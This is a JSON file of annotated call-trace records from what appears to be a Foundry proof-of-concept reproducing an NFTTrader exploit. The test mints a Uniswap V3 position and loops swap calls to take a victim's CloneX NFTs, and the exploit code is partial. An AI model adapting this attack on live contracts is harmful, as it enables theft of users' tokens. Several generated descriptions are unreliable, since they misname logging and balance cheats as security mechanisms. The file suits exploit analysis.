[
    {
        "id": "3456469",
        "args": "",
        "original_code": "    function testExploit() public {\n        deal(address(this), 0.001 ether);\n\n        IUniV3PosNFT.MintParams memory params = IUniV3PosNFT.MintParams({\n            token0: address(USDC),\n            token1: address(WETH),\n            fee: 500,\n            tickLower: 0,\n            tickUpper: 100_000,\n            amount0Desired: 0,\n            amount1Desired: address(this).balance,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp\n        });\n\n        (uint256 positionId,,,) = UniV3PosNFT.mint{value: address(this).balance}(params);\n\n        vm.roll(18_799_435);\n        deal(address(this), 0.1 ether);\n        UniV3PosNFT.setApprovalForAll(address(CloneX), true);\n\n        vm.roll(18_799_487);\n        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);\n        require(CloneX.isApprovedForAll(victim, address(NFTTrader)));\n\n        emit log_named_uint(\"Victim CloneX balance before attack\", CloneX.balanceOf(victim));\n\n        emit log_named_uint(\"Exploiter CloneX balance before attack\", CloneX.balanceOf(address(this)));\n\n        uint256[] memory victimsCloneXTokenIds = new uint256[](CloneX.balanceOf(victim));\n        victimsCloneXTokenIds[0] = 6670;\n        victimsCloneXTokenIds[1] = 6650;\n        victimsCloneXTokenIds[2] = 4843;\n        victimsCloneXTokenIds[3] = 5432;\n        victimsCloneXTokenIds[4] = 9870;\n\n        for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {\n            INFTTrader.swapIntent memory _swapIntent = INFTTrader.swapIntent({\n                id: 0,\n                addressOne: address(0),\n                valueOne: 0,\n                addressTwo: address(this),\n                valueTwo: 0,\n                swapStart: 0,\n                swapEnd: 0,\n                swapFee: 0,\n                status: 0\n            });\n\n            INFTTrader.swapStruct[] memory _nftsOne = new INFTTrader.swapStruct[](0);\n            INFTTrader.swapStruct[] memory _nftsTwo = new INFTTrader.swapStruct[](2);\n            uint256[] memory _tokenId1 = new uint256[](1);\n            _tokenId1[0] = positionId;\n            uint256[] memory _blc = new uint256[](0);\n            _nftsTwo[0] = INFTTrader.swapStruct({\n                dapp: address(UniV3PosNFT),\n                typeStd: tradeSquad,\n                tokenId: _tokenId1,\n                blc: _blc,\n                data: \"\"\n            });\n\n            uint256[] memory _tokenId2 = new uint256[](1);\n            _tokenId2[0] = victimsCloneXTokenIds[i];\n            _nftsTwo[1] = INFTTrader.swapStruct({\n                dapp: address(CloneX),\n                typeStd: tradeSquad,\n                tokenId: _tokenId2,\n                blc: _blc,\n                data: \"\"\n            });\n            vm.recordLogs();\n            NFTTrader.createSwapIntent{value: 0.005 ether}(_swapIntent, _nftsOne, _nftsTwo);\n            Vm.Log[] memory entries = vm.getRecordedLogs();\n            (swapId,) = abi.decode(entries[0].data, (uint256, address));\n            NFTTrader.closeSwapIntent{value: 0.005 ether}(address(this), swapId);\n",
        "description": "1. **Core functions:**\n   The `testExploit` function is designed to simulate an attack scenario where the attacker interacts with a decentralized exchange (Uniswap V3) and a non-fungible token (NFT) trading platform. The function first mints a liquidity position on Uniswap V3 using a small amount of Ether. Then, it manipulates the blockchain state by rolling the block number forward and setting approvals for NFT trading. Finally, it attempts to swap the attacker's liquidity position for specific NFTs owned by a victim, effectively trying to exploit the system to gain control over the victim's NFTs.\n\n2. **Security mechanism:**\n   - **`deal` function:** This is used to manipulate the balance of the contract, ensuring it has enough Ether to perform the operations.\n   - **`vm.roll` function:** This simulates the advancement of the blockchain block number, which can be used to test time-dependent logic.\n   - **`setApprovalForAll` function:** This is used to grant permission to other contracts (like `CloneX` and `NFTTrader`) to manage the contract's NFTs.\n   - **`require` statement:** This ensures that certain conditions are met before proceeding, such as verifying that the victim has approved the NFT trader.\n   - **`emit` statements:** These are used to log the state of the system before and after the attack, helping to track the changes.\n\n3. **Parameter Function:**\n   - **`params` in `UniV3PosNFT.mint`:** This parameter defines the details of the liquidity position to be minted, including the tokens involved, the fee tier, the price range, and the desired amounts of tokens.\n   - **`_swapIntent` in `NFTTrader.createSwapIntent`:** This parameter defines the swap intent, including the addresses and values involved in the swap.\n   - **`_nftsOne` and `_nftsTwo` in `NFTTrader.createSwapIntent`:** These parameters define the NFTs involved in the swap, including their contract addresses, token IDs, and other details.\n\n4. **Return description:**\n   - **`positionId`:** This is the ID of the liquidity position minted on Uniswap V3. It is used later in the swap process to identify the position being traded.\n   - **`swapId`:** This is the ID of the swap intent created on the NFT trading platform. It is used to close the swap intent after it has been created.\n\n**In summary,**\nThe `testExploit` function simulates an attack where the attacker mints a liquidity position on Uniswap V3, manipulates the blockchain state, and then attempts to swap this position for specific NFTs owned by a victim. The function uses various security mechanisms to ensure the attack is executed correctly, and it logs the state of the system before and after the attack. The parameters define the details of the operations being performed, and the return values identify the positions and swaps created during the attack.",
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000 [1e15]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "302977",
        "args": "MintParams({ token0: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, token1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 500, tickLower: 0, tickUpper: 100000 [1e5], amount0Desired: 0, amount1Desired: 1000000000000000 [1e15], amount0Min: 0, amount1Min: 0, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1702739279 [1.702e9] }",
        "original_code": "    function mint(MintParams calldata params)\n        external\n        payable\n        override\n        checkDeadline(params.deadline)\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        )\n    {\n        IUniswapV3Pool pool;\n        (liquidity, amount0, amount1, pool) = addLiquidity(\n            AddLiquidityParams({\n                token0: params.token0,\n                token1: params.token1,\n                fee: params.fee,\n                recipient: address(this),\n                tickLower: params.tickLower,\n                tickUpper: params.tickUpper,\n                amount0Desired: params.amount0Desired,\n                amount1Desired: params.amount1Desired,\n                amount0Min: params.amount0Min,\n                amount1Min: params.amount1Min\n            })\n        );\n\n        _mint(params.recipient, (tokenId = _nextId++));\n\n        bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);\n        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);\n\n        // idempotent set\n        uint80 poolId =\n            cachePoolKey(\n                address(pool),\n                PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee})\n            );\n\n        _positions[tokenId] = Position({\n            nonce: 0,\n            operator: address(0),\n            poolId: poolId,\n            tickLower: params.tickLower,\n            tickUpper: params.tickUpper,\n            liquidity: liquidity,\n            feeGrowthInside0LastX128: feeGrowthInside0LastX128,\n            feeGrowthInside1LastX128: feeGrowthInside1LastX128,\n            tokensOwed0: 0,\n            tokensOwed1: 0\n        });\n\n        emit IncreaseLiquidity(tokenId, liquidity, amount0, amount1);\n    }\n\n    modifier isAuthorizedForToken(uint256 tokenId) {\n        require(_isApprovedOrOwner(msg.sender, tokenId), 'Not approved');\n        _;\n    }\n\n",
        "description": "1. **Core functions**:  \n   The `mint` function is designed to create a new token and add liquidity to a specific pool in a decentralized exchange. It takes in parameters that define the details of the liquidity to be added, such as the tokens involved, the fee tier, and the desired amounts. The function then calculates the liquidity and the amounts of tokens required, mints a new token for the recipient, and stores the position details associated with the token. It also emits an event to log the increase in liquidity.\n\n2. **Security mechanism**:  \n   The function uses the `checkDeadline` modifier to ensure the transaction is executed before a specified deadline, preventing outdated transactions. Additionally, the `isAuthorizedForToken` modifier (though not directly used in this function) ensures that only authorized users can interact with specific tokens, adding a layer of access control. The function also uses `payable` to handle incoming Ether securely and `override` to ensure it correctly replaces any inherited function with the same name.\n\n3. **Parameter Function**:  \n   The `params` parameter is a structured input that contains all the necessary details for adding liquidity, such as the two tokens involved (`token0` and `token1`), the fee tier (`fee`), the recipient address (`recipient`), the price range (`tickLower` and `tickUpper`), and the desired and minimum amounts of tokens (`amount0Desired`, `amount1Desired`, `amount0Min`, `amount1Min`). These parameters guide the liquidity addition process and ensure the transaction meets the user's requirements.\n\n4. **Return description**:  \n   The function returns four values:  \n   - `tokenId`: A unique identifier for the newly minted token.  \n   - `liquidity`: The amount of liquidity added to the pool.  \n   - `amount0`: The actual amount of the first token used in the transaction.  \n   - `amount1`: The actual amount of the second token used in the transaction.  \n   These values are calculated based on the provided parameters and the current state of the pool, ensuring the user receives accurate information about the transaction.\n\n**In summary**, the `mint` function is a key operation that adds liquidity to a pool, mints a new token, and securely stores the associated position details. It uses security measures like deadline checks and access control to ensure safe execution, and it returns detailed information about the transaction for transparency.",
        "return_value": "625712 [6.257e5], 6785362427017 [6.785e12], 0, 999999999999924 [9.999e14]"
    },
    {
        "id": "2696",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "1670412987134345111050601056906742 [1.67e33], 199134 [1.991e5], 377, 722, 722, 0, true"
    },
    {
        "id": "102777",
        "args": "UniV3PosNFT: [0xC36442b4a4522E871399CD717aBDD847Ab11FE88], 0, 100000 [1e5], 6785362427017 [6.785e12], 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000001f40000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496",
        "original_code": null,
        "description": null,
        "return_value": "0, 999999999999924 [9.999e14]"
    },
    {
        "id": "2534",
        "args": "0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640",
        "original_code": null,
        "description": null,
        "return_value": "18355899571230551064355 [1.835e22]"
    },
    {
        "id": "39629",
        "args": "0, 999999999999924 [9.999e14], 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000001f40000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23974",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6062",
        "args": "0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, 999999999999924 [9.999e14]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640",
        "original_code": null,
        "description": null,
        "return_value": "18355900571230551064279 [1.835e22]"
    },
    {
        "id": "1013",
        "args": "0x7ef489174953c25dddb21809ef23d99f8936621706c5644fc9eebe7ab7aea6f1",
        "original_code": null,
        "description": null,
        "return_value": "13570724854034 [1.357e13], 0, 0, 0, 0"
    },
    {
        "id": "0",
        "args": "18799435 [1.879e7]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "24802",
        "args": "CloneX: [0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B], true",
        "original_code": "    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(operator != _msgSender(), \"ERC721: approve to caller\");\n\n        _operatorApprovals[_msgSender()][operator] = approved;\n        emit ApprovalForAll(_msgSender(), operator, approved);\n    }\n\n",
        "description": "1. **Core function**:  \n   This function allows a user to give or revoke permission for another address (called the `operator`) to manage all of their tokens. It essentially controls whether the `operator` can act on behalf of the user for all token-related actions.\n\n2. **Security mechanism**:  \n   - `require(operator != _msgSender(), \"ERC721: approve to caller\")`: This ensures that a user cannot approve themselves as an operator, preventing unnecessary or redundant permissions.  \n   - The function is marked as `public virtual override`, meaning it can be inherited and customized by other contracts while maintaining its core functionality.  \n   - The use of `_msgSender()` ensures that the function correctly identifies the caller, adding a layer of security against potential impersonation.\n\n3. **Parameter Function**:  \n   - `operator`: The address of the user being granted or revoked permission to manage tokens.  \n   - `approved`: A boolean value (`true` or `false`) that determines whether the `operator` is approved (`true`) or not (`false`).\n\n4. **Return description**:  \n   This function does not return any value. Instead, it updates an internal mapping (`_operatorApprovals`) to store the approval status and emits an event (`ApprovalForAll`) to log the action. The event includes the caller\u2019s address, the `operator`\u2019s address, and the approval status.\n\n**In summary**, this function manages permissions for token management by allowing a user to approve or revoke another address\u2019s ability to handle all their tokens. It includes checks to prevent self-approval and logs the action for transparency.",
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "18799487 [1.879e7]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "24802",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], true",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "2793",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db], NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2678",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "5"
    },
    {
        "id": "2678",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "678",
        "args": "Victim: [0x23938954BC875bb8309AEF15e2Dead54884B73Db]",
        "original_code": null,
        "description": null,
        "return_value": "5"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "385263",
        "args": "swapIntent({ id: 0, addressOne: 0x0000000000000000000000000000000000000000, valueOne: 0, addressTwo: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, valueTwo: 0, swapStart: 0, swapEnd: 0, swapFee: 0, status: 0 }",
        "original_code": "    function createSwapIntent(swapIntent memory _swapIntent, swapStruct[] memory _nftsOne, swapStruct[] memory _nftsTwo) payable public whenNotPaused {\n        if(payment.status) {\n            if(ERC721Interface(TRADESQUAD).balanceOf(msg.sender)==0) {\n                require(msg.value>=payment.value.add(_swapIntent.valueOne), \"Not enought WEI for handle the transaction\");\n                _swapIntent.swapFee = getWeiPayValueAmount() ;\n            }\n            else {\n                require(msg.value>=_swapIntent.valueOne, \"Not enought WEI for handle the transaction\");\n                _swapIntent.swapFee = 0 ;\n            }\n        }\n        else\n            require(msg.value>=_swapIntent.valueOne, \"Not enought WEI for handle the transaction\");\n\n        _swapIntent.addressOne = msg.sender;\n        _swapIntent.id = _swapIds.current();\n        _swapIntent.swapStart = block.timestamp;\n        _swapIntent.swapEnd = 0;\n        _swapIntent.status = swapStatus.Opened ;\n\n        swapMatch[_swapIds.current()] = swapList[msg.sender].length;\n        swapList[msg.sender].push(_swapIntent);\n        \n        uint256 i;\n        for(i=0; i<_nftsOne.length; i++)\n            nftsOne[_swapIntent.id].push(_nftsOne[i]);\n            \n        for(i=0; i<_nftsTwo.length; i++)\n            nftsTwo[_swapIntent.id].push(_nftsTwo[i]);\n        \n        for(i=0; i<nftsOne[_swapIntent.id].length; i++) {\n            require(whiteList[nftsOne[_swapIntent.id][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsOne[_swapIntent.id][i].typeStd == ERC20) {\n                ERC20Interface(nftsOne[_swapIntent.id][i].dapp).transferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].blc[0]);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == ERC721) {\n                ERC721Interface(nftsOne[_swapIntent.id][i].dapp).safeTransferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].tokenId[0], nftsOne[_swapIntent.id][i].data);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsOne[_swapIntent.id][i].dapp).safeBatchTransferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].tokenId, nftsOne[_swapIntent.id][i].blc, nftsOne[_swapIntent.id][i].data);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == CRYPTOPUNK) { // Controllo che il CP sia presente sul proxy e che non sia in uso in un altro trade\n                require(punkInUse[nftsOne[_swapIntent.id][i].tokenId[0]] == false, \"Punk in use on another trade\");\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsOne[_swapIntent.id][i].tokenId[0]) == address(punkProxies[msg.sender]), \"CryptoPunk missing\");\n                punkInUse[nftsOne[_swapIntent.id][i].tokenId[0]] = true;\n            }\n            else {\n                customInterface(dappRelations[nftsOne[_swapIntent.id][i].dapp]).bridgeSafeTransferFrom(nftsOne[_swapIntent.id][i].dapp, _swapIntent.addressOne, dappRelations[nftsOne[_swapIntent.id][i].dapp], nftsOne[_swapIntent.id][i].tokenId, nftsOne[_swapIntent.id][i].blc, nftsOne[_swapIntent.id][i].data);\n            }\n        }\n\n        emit swapEvent(msg.sender, (block.timestamp-(block.timestamp%secs)), _swapIntent.status, _swapIntent.id, _swapIntent.addressTwo);\n        _swapIds.increment();\n    }\n    \n    // Close the swap\n",
        "description": "1. **Core functions**:  \n   The `createSwapIntent` function is designed to initiate a swap or trade between two parties involving NFTs (Non-Fungible Tokens) or other digital assets. It sets up the details of the swap, such as the assets involved, the participants, and the timing. The function also ensures that the assets being swapped are valid and transfers them to a secure holding area (the contract itself) during the swap process. Additionally, it emits an event to log the swap initiation.\n\n2. **Security mechanism**:  \n   - **`whenNotPaused`**: Ensures the function can only be executed when the contract is not paused, preventing actions during maintenance or emergencies.  \n   - **`require` statements**: These checks ensure that the sender has sent enough funds (`msg.value`) to cover the transaction fees and that the assets being swapped are valid and approved by the system.  \n   - **WhiteList check**: Verifies that the assets being swapped are from approved platforms (`dapp`), preventing unauthorized or unsupported assets from being included in the swap.  \n   - **Punk usage check**: For CryptoPunks, it ensures that the specific Punk is not already in use in another trade and that it is correctly associated with the sender\u2019s proxy address.  \n\n3. **Parameter Function**:  \n   - **`_swapIntent`**: Contains details about the swap, such as the values involved, the participants, and the status of the swap.  \n   - **`_nftsOne` and `_nftsTwo`**: Arrays of structures representing the NFTs or assets being swapped by the two parties. These structures include details like the asset type, token IDs, balances, and associated data.  \n   - **`msg.sender`**: The address of the person initiating the swap.  \n   - **`msg.value`**: The amount of cryptocurrency (in WEI) sent with the transaction to cover fees or other requirements.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it performs several actions:  \n   - It updates the `_swapIntent` structure with details like the sender\u2019s address, swap ID, start time, and status.  \n   - It transfers the assets involved in the swap to the contract for safekeeping during the swap process.  \n   - It emits an event (`swapEvent`) to log the swap initiation, including details like the sender, timestamp, swap status, and swap ID.  \n   - It increments the swap ID counter (`_swapIds`) to ensure each swap has a unique identifier.  \n\n**In summary**, the `createSwapIntent` function is responsible for setting up and initiating a swap between two parties involving NFTs or other digital assets. It ensures the swap is valid, secure, and properly logged, while also handling the transfer of assets to a secure holding area during the process.",
        "return_value": "Returned"
    },
    {
        "id": "2798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "[([0x20c004714deaf94f3e80538ac812eb372a6d40711070cd585f447f9ef76d525d, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0x00000000000000000000000000000000000000000000000000000000657ce880, 0x0000000000000000000000000000000000000000000000000000000000000000], 0x000000000000000000000000000000000000000000000000000000000000286c0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496, 0xC310e760778ECBca4C65B6C559874757A4c4Ece0)]"
    },
    {
        "id": "240373",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10348 [1.034e4]",
        "original_code": "    function closeSwapIntent(address _swapCreator, uint256 _swapId) payable public whenNotPaused {\n        require(swapList[_swapCreator][swapMatch[_swapId]].status == swapStatus.Opened, \"Swap Status is not opened\");\n        require(swapList[_swapCreator][swapMatch[_swapId]].addressTwo == msg.sender, \"You're not the interested counterpart\");\n        if(payment.status) {\n            if(ERC721Interface(TRADESQUAD).balanceOf(msg.sender)==0) {\n                require(msg.value>=payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].valueTwo), \"Not enought WEI for handle the transaction\");\n                // Move the fees to the vault\n                if(payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].swapFee) > 0)\n                    VAULT.transfer(payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].swapFee));\n            }\n            else {\n                require(msg.value>=swapList[_swapCreator][swapMatch[_swapId]].valueTwo, \"Not enought WEI for handle the transaction\");\n                if(swapList[_swapCreator][swapMatch[_swapId]].swapFee>0)\n                    VAULT.transfer(swapList[_swapCreator][swapMatch[_swapId]].swapFee);\n            }\n        }\n        else\n            require(msg.value>=swapList[_swapCreator][swapMatch[_swapId]].valueTwo, \"Not enought WEI for handle the transaction\");\n        \n        swapList[_swapCreator][swapMatch[_swapId]].addressTwo = msg.sender;\n        swapList[_swapCreator][swapMatch[_swapId]].swapEnd = block.timestamp;\n        swapList[_swapCreator][swapMatch[_swapId]].status = swapStatus.Closed;\n        \n        //From Owner 1 to Owner 2\n        uint256 i;\n        for(i=0; i<nftsOne[_swapId].length; i++) {\n            require(whiteList[nftsOne[_swapId][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsOne[_swapId][i].typeStd == ERC20) {\n                ERC20Interface(nftsOne[_swapId][i].dapp).transfer(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].blc[0]);\n            }\n            else if(nftsOne[_swapId][i].typeStd == ERC721) {\n                ERC721Interface(nftsOne[_swapId][i].dapp).safeTransferFrom(address(this), swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId[0], nftsOne[_swapId][i].data);\n            }\n            else if(nftsOne[_swapId][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsOne[_swapId][i].dapp).safeBatchTransferFrom(address(this), swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId, nftsOne[_swapId][i].blc, nftsOne[_swapId][i].data);\n            }\n            else if(nftsOne[_swapId][i].typeStd == CRYPTOPUNK) { // Controllo che il CP sia su questo smart contract\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsOne[_swapId][i].tokenId[0]) == address(punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressOne]), \"CryptoPunk missing\");\n                punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressOne].proxyTransferPunk(CRYPTOPUNK, swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId[0]);\n                punkInUse[nftsOne[_swapId][i].tokenId[0]] = false;\n            }\n            else {\n                customInterface(dappRelations[nftsOne[_swapId][i].dapp]).bridgeSafeTransferFrom(nftsOne[_swapId][i].dapp, dappRelations[nftsOne[_swapId][i].dapp], swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId, nftsOne[_swapId][i].blc, nftsOne[_swapId][i].data);\n            }\n        }\n        if(swapList[_swapCreator][swapMatch[_swapId]].valueOne > 0)\n            swapList[_swapCreator][swapMatch[_swapId]].addressTwo.transfer(swapList[_swapCreator][swapMatch[_swapId]].valueOne);\n        \n        //From Owner 2 to Owner 1\n        for(i=0; i<nftsTwo[_swapId].length; i++) {\n            require(whiteList[nftsTwo[_swapId][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsTwo[_swapId][i].typeStd == ERC20) {\n                ERC20Interface(nftsTwo[_swapId][i].dapp).transferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].blc[0]);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == ERC721) {\n                ERC721Interface(nftsTwo[_swapId][i].dapp).safeTransferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId[0], nftsTwo[_swapId][i].data);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsTwo[_swapId][i].dapp).safeBatchTransferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId, nftsTwo[_swapId][i].blc, nftsTwo[_swapId][i].data);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == CRYPTOPUNK) {\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsTwo[_swapId][i].tokenId[0]) == address(punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressTwo]), \"CryptoPunk missing\");\n                punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressTwo].proxyTransferPunk(CRYPTOPUNK, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId[0]);\n                punkInUse[nftsTwo[_swapId][i].tokenId[0]] = false;\n            }\n            else {\n                customInterface(dappRelations[nftsTwo[_swapId][i].dapp]).bridgeSafeTransferFrom(nftsTwo[_swapId][i].dapp, swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId, nftsTwo[_swapId][i].blc, nftsTwo[_swapId][i].data);\n            }\n        }\n        if(swapList[_swapCreator][swapMatch[_swapId]].valueTwo>0)\n            swapList[_swapCreator][swapMatch[_swapId]].addressOne.transfer(swapList[_swapCreator][swapMatch[_swapId]].valueTwo);\n\n        emit swapEvent(msg.sender, (block.timestamp-(block.timestamp%secs)), swapStatus.Closed, _swapId, _swapCreator);\n    }\n\n    // Cancel Swap\n",
        "description": "1. Core functions:  \nThe `closeSwapIntent` function is designed to finalize a swap agreement between two parties. It ensures that the swap is in the correct state and that the caller is the intended counterpart. The function handles the transfer of assets (like tokens or NFTs) between the two parties and ensures that any required fees are paid. It also updates the swap status to \"Closed\" and records the completion time. Additionally, it emits an event to log the swap's closure.\n\n2. Security mechanism:  \nThe function uses several security measures:  \n- `whenNotPaused`: Ensures the function can only be executed when the contract is not paused.  \n- `require` statements: These checks ensure that the swap is in the correct state, the caller is the correct counterpart, and sufficient funds are provided.  \n- Whitelist checks: Ensures that only approved DApps (decentralized applications) are used in the swap.  \n- Transfer safeguards: Verifies that assets like CryptoPunks are correctly held before transferring them.  \n- Fee handling: Ensures fees are transferred to a secure vault if applicable.  \n\n3. Parameter Function:  \n- `_swapCreator`: The address of the user who initiated the swap.  \n- `_swapId`: The unique identifier for the swap agreement.  \nThese parameters help locate the specific swap in the system and verify that the caller is authorized to close it.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it performs several actions:  \n- Updates the swap status to \"Closed\" and records the completion time.  \n- Transfers assets (tokens, NFTs, or CryptoPunks) between the two parties.  \n- Handles fee payments and transfers them to a vault if required.  \n- Emits an event to log the swap's closure, including details like the caller, timestamp, swap ID, and creator.  \n\nIn summary,  \nThe `closeSwapIntent` function securely finalizes a swap agreement by transferring assets between parties, handling fees, and updating the swap status. It ensures only authorized users can execute the function and that all conditions are met before proceeding. The function also logs the swap's completion for transparency and record-keeping.",
        "return_value": "Returned"
    },
    {
        "id": "798",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "1497",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "78107",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
        "original_code": "    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        (bool success, bytes memory data) =\n            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'STF');\n    }\n\n    /// @notice Transfers tokens from msg.sender to a recipient\n    /// @dev Errors with ST if transfer fails\n    /// @param token The contract address of the token which will be transferred\n    /// @param to The recipient of the transfer\n    /// @param value The value of the transfer\n",
        "description": "1. Core functions:  \nThe `safeTransferFrom` function is designed to securely transfer tokens from one address to another. It interacts with an ERC20 token contract to move a specified amount of tokens (`value`) from the `from` address to the `to` address. This function ensures that the transfer is executed correctly and handles any potential errors that might occur during the process.\n\n2. Security mechanism:  \nThe function includes a `require` statement to verify that the token transfer was successful. It checks two conditions:  \n- The `success` boolean must be `true`, indicating the external call to the token contract was successful.  \n- The returned data (`data`) must either be empty or decode to `true`, ensuring the transfer was confirmed by the token contract.  \nIf either condition fails, the function reverts with the error message `'STF'`, preventing any unintended state changes.\n\n3. Parameter Function:  \n- `token`: The address of the ERC20 token contract that holds the tokens to be transferred.  \n- `from`: The address from which the tokens will be taken.  \n- `to`: The address that will receive the tokens.  \n- `value`: The amount of tokens to be transferred.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it ensures the transfer is successful by checking the result of the external call to the token contract. If the transfer fails, the function reverts, stopping further execution and preventing any unintended consequences.  \n\nIn summary, the `safeTransferFrom` function securely transfers ERC20 tokens between addresses, using checks to ensure the operation is successful and reverting if any issues arise.",
        "return_value": "Returned"
    },
    {
        "id": "3784",
        "args": "NFTTrader: [0xC310e760778ECBca4C65B6C559874757A4c4Ece0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 625712 [6.257e5], 0x",
